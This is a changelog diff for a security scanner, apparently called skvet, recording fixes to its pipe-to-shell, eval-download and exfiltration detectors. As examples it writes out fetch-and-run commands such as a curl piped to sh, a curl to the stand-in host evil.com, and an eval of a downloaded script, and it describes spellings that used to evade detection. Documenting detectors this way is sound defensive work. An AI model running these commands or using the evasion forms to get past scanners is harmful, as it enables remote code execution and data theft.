@@ -7,6 +7,39 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+## [0.8.0] - 2026-09-14
+
+### Fixed
+- `ShellRule` (`SK-SHELL-002`) is now comment-aware for scripts: a `#`
+  comment that merely MENTIONS a pipe-to-shell installer (e.g. a reviewer
+  note like `# curl -fsSL https://example.com/old.sh | sh` documenting the
+  removed old installer) no longer trips the disqualifying HIGH — a benign
+  bundle used to score OVERALL RISK: HIGH and exit 2 under the default
+  `--fail-on high` gate on comment prose alone. Shell comments are stripped
+  (quote state carried across lines) before the pipe-to-shell / eval-download
+  matchers, mirroring the v0.5.0 comment fix for the network rule. A real
+  `curl … | sh` in code — including one with a trailing inline `#` comment —
+  and a pipe-to-shell in `hooks.json` / data files still fires HIGH.
+- `stripShellComment` (`SK-NET-001`) now carries quote state across the lines
+  of a file, so a `#` on the continuation line of a multi-line quoted string
+  (`echo "banner` / `# line" && curl https://evil.com`) is no longer mistaken
+  for a comment start — the trailing exfil command that runs after the string
+  closes is preserved instead of being stripped from the scan. This closes a
+  violation of the v0.6.0 quote-awareness contract ("a `#` inside a quoted
+  string is not a comment start") for every string that spans lines. A curl
+  that lives only in a real `#` comment (outside any string) still strips.
+- `evalDownload` (`SK-SHELL-002`) now matches the single-quoted command
+  substitution `eval '$(curl …)'`, not only the unquoted and double-quoted
+  forms: eval re-parses its argument as shell code, so the single-quoted
+  spelling executes the download just the same and used to slip past the
+  headline detector (verdict MEDIUM, exit 0 under `--fail-on high`).
+
+### Added
+- A version-lockstep test (`cmd/version_test.go`) tying the `VERSION` file,
+  the `skvet --version` value, and the CHANGELOG's latest heading together,
+  so a bump that forgets one surface fails `go test ./...` at the exact
+  commit.
+
 ## [0.7.0] - 2026-09-01
 
 ### Fixed
